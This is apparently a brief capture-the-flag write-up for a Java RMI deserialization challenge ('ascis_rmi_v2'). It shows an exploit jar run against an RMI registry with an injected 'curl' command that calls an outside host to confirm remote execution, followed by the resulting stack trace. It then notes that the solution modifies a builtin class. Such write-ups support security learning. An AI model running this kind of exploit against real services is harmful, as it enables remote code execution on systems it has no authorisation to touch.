```
 ~/java_challs/ascis_rmi_v2/solution/ java -jar ascis_rmi_v2.jar localhost 1099 "curl tsug0d.com:4321/?aaa"
java.lang.ClassCastException: javax.management.BadAttributeValueExpException cannot be cast to rmi.Player
	at rmi.ASCISInterfImpl.login(ASCISInterfImpl.java:19)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
  ```
 
<img src="https://i.imgur.com/iK8prId.png" width="50%" />

Same as v1, but more tricky since toString() is removed and we have to modify builtin class (more explain in code ./src )
